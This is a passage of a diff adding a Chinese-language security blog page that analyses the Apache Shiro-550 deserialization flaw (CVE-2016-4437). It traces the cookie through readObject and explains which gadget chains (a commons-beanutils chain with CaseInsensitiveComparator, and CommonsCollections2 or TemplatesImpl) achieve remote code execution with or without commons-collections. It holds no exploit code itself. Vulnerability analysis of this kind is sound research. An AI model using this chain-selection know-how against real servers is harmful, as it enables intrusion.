+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193531766.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193531766.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193531766.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193531766.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193531766.jpg" />
+    </a>
+<p>一步步跟进，经过解密操作然后进入到了<code>shiro-core-1.2.4-sources.jar!/org/apache/shiro/io/DefaultSerializer.java</code>的<code>deserialize</code>方法</p>
+<p>看见了<code>readObject</code>对数据进行反序列化操作</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193536284.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193536284.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193536284.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193536284.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193536284.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193536284.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193536284.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193536284.jpg" />
+    </a>
+<p>前面我们知道加密解密过程可控，所以我们可以控制序列化数据，利用反序列化进行恶意操作</p>
+<p>但是有了反序列化点，我们还得找到可以利用的链</p>
+<h3 id="无cc依赖">无cc依赖</h3>
+<p>前文在环境搭建部分我提到了添加 commons-collections-3.2.1 库是为了方便演示有依赖的反序列化RCE，实际上原生shiro是不依赖 commons-collections 库的，但是用到了 commons-beanutils 库</p>
+<p>把pom.xml中 commons-collections 的依赖配置去掉，重新打包环境</p>
+<p>参考phith0n的文章可以知道一条无cc依赖的cbu链可以打原生shiro组件，原文讲的很详细</p>
+<p>在shiro中，它的 commons-beanutils 虽然包含了一部分 commons-collections 的类，但是不全，shiro正常使用得以满足，但是我们利用反序列化链用到的类部分不存在</p>
+<p>所以直接利用 ysoserial 里的cbu链打，会爆出<code>org.apache.commons.collections.comparators.ComparableComparator</code>不存在，但是我们可以找到一个替代品，<code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了<code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码中，兼容性强</p>
+<p>构造新的cbu链，此时就可以直接打没有commons-collections库的shiro组件了</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193542058.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193542058.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193542058.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193542058.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193542058.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193542058.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193542058.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193542058.jpg" />
+    </a>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193547941.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193547941.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193547941.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193547941.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193547941.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193547941.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193547941.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193547941.jpg" />
+    </a>
+<h3 id="有cc依赖">有cc依赖</h3>
+<p>另外值得我们注意的是，当shiro组件存在 commons-collections:4.0 依赖时，我们可以直接利用 ysoserial 的 CommonsCollections2 利用链，这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令</p>
+<p>shiro组件不能出现数组形式的利用链原因是 shiro resovleClass 使用的是<code>ClassLoader.loadClass()</code>而非<code>Class.forName()</code>，而<code>ClassLoader.loadClass</code>不支持装载数组类型的class，具体分析可以参考wh1t3p1g的博客</p>
+<p>因为不能使用数组形式，之前在<code>commons-collections:3.2.1</code>下可以利用的链都失效了，但是我们可以想到后半段可以不使用<code>ChainedTransformer</code>构造，利用cc3中分析提到的<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的恶意class字节码，这样可以绕过使用数组类型的对象</p>
+<p>wh1t3p1g师傅已经详细描述了触发<code>TemplatesImpl.newTransformer</code>的方法，我将会在cc链分析文章中对其进行分析，这里就不再过多叙述了，参考：<a href="https://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/" target="_blank" rel="noopener noreffer">https://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/</a></p>
+<p>当然在有cc依赖的情况下我们还可以使用 ysoserial 里的cbu链</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></p>
+<p><a href="https://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/">https://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/</a></p>
+<p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-09-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/shiro_550_analysis/" data-title="Shiro-550漏洞分析(CVE-2016-4437)" data-hashtags="Java,shiro"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/shiro_550_analysis/" data-hashtag="Java"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/shiro_550_analysis/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/shiro_550_analysis/" data-title="Shiro-550漏洞分析(CVE-2016-4437)"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/shiro/">shiro</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/scientific_adfree_networking/" class="prev" rel="prev" title="[WMCTF2021]Scientific_adfree_networking"><i class="fas fa-angle-left fa-fw"></i>[WMCTF2021]Scientific_adfree_networking</a>
+            <a href="/shiro_721_analysis/" class="next" rel="next" title="Shiro-721漏洞分析(CVE-2019-12422)">Shiro-721漏洞分析(CVE-2019-12422)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
